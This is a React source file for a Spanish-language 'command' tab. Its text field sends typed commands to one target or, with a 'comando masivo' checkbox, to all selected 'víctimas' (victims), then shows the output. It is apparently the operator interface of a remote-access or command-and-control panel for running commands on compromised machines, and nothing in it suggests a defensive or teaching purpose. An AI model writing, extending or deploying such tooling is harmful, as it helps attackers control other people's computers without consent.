import { useContext, useState } from "react";
import { PanelContext } from "../../context/PanelContext";

export default function TabComandos() {
    const [comando, setComando] = useState('');
    const { enviarComando, respuestaComando, enviarComandoMasivo } = useContext(PanelContext);
    const [check, setcheck] = useState(false);

    const procesa = (event) => {
        if (event.key === 'Enter') {
            event.preventDefault();
            if (check) {
                enviarComandoMasivo(comando)
            } else {
                enviarComando(comando)
            }
            setComando('');
        }
    }

    return (
        <>
            <div className="row">
                <div className="col-12 col-md-8 mb-3">
                    <input
                        type="text"
                        className="form-control"
                        placeholder="Ingresa un Comando"
                        value={comando}
                        onChange={(e) => setComando(e.target.value)}
                        onKeyPress={procesa}
                    />
                </div>
                <div className="col-12 col-md-4">
                    <div className="form-check">
                        <input className="form-check-input" type="checkbox" value={check} onChange={(e) => setcheck(e.target.checked)}
                            title="Enviar comando a todas las víctimas seleccionadas en la lista. Marca esta casilla para comandos masivos." />
                        <label className="form-check-label" htmlFor="defaultCheck1">
                            comando masivo
                        </label>
                    </div>
                </div>
            </div>


            <div className="mt-4">
                {respuestaComando && (
                    <div className="alert alert-warning" role="alert">
                        <pre>
                            {respuestaComando}
                        </pre>
                    </div>
                )}

            </div>


        </>

    );
}
